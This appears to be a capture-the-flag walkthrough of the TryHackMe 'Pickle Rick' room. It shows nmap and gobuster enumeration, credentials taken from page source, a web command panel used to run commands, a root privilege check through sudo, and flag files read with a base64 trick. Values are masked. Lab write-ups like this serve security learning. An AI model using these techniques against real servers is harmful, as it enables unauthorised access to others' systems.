<!-- TOC -->

- [Pickle Rick](#pickle-rick)
    - [Discovery and Scanning](#discovery-and-scanning)
    - [Exploitation](#exploitation)

<!-- /TOC -->

# Pickle Rick

[Pickle Rick Room](https://tryhackme.com/room/picklerick)

A Rick and Morty CTF. Help turn Rick back into a human!

This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

| Title | IP Address |
| :---- | :---- |
| Pickle Rick | `1*.**.***.***` |

## Discovery and Scanning

```bash
sudo nmap -A -vv -T4 -oA initial 1*.**.***.***
```

> `80/tcp open **** syn-ack ttl 61 A***** h**** 2.4.18 ((Ubuntu))`

View Page Source: `http://1*.**.***.***`

> `Username: R***R****`

```bash
gobuster dir -u 1*.**.***.***:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,sh,cer,css,htm,html,js,jsp,php,py,xhtml -t 100
```

> ```
> /index.html           (Status: 200) [Size: 1062]
> /login.php            (Status: 200) [Size: 882]
> /r*****.***           (Status: 200) [Size: 17]
> /assets               (Status: 301) [Size: 315] [--> http://1*.**.***.***/assets/]
> /portal.php           (Status: 302) [Size: 0] [--> /login.php]                    
> /denied.php           (Status: 302) [Size: 0] [--> /login.php]
> /c***.***             (Status: 200) [Size: 54]                    
> /server-status        (Status: 403) [Size: 301]   
> ```

Go to: `http://1*.**.***.***/r*****.***`

> `W***************`

Go to: `http://1*.**.***.***/c***.***`

> `L*** a***** t** f*** s***** f** t** o**** i*********.`

## Exploitation

Using `R***R****:W***************`

To: `http://1*.**.***.***/login.php`

View Page Source: `http://1*.**.***.***/portal.php#`

> `<!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== -->`

Decoded 7 times with `base64` -> `rabbit hole`

Using the Command Panel:

```bash
sudo -l
```

> `(ALL) NOPASSWD: ALL`

```bash
ls -la
```

> `-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 S****S*****P*****I*****.*** `

Go to: `http://1*.**.***.***/S****S*****P*****I*****.*** `

> `m*. m****** h***`

```bash
ls -la /home/rick
```

> `-rwxrwxrwx 1 root root   13 Feb 10  2019 s***** i**********`

```bash
base64 "/home/rick/s***** i**********" | base64 -d
```

> `1 j**** t***`

```bash
sudo ls -la /root
```

> `-rw-r--r--  1 root root   29 Feb 10  2019 3**.***`

```bash
sudo base64 "/root/3**.***" | base64 -d
```

> `3** i**********: f**** j****`
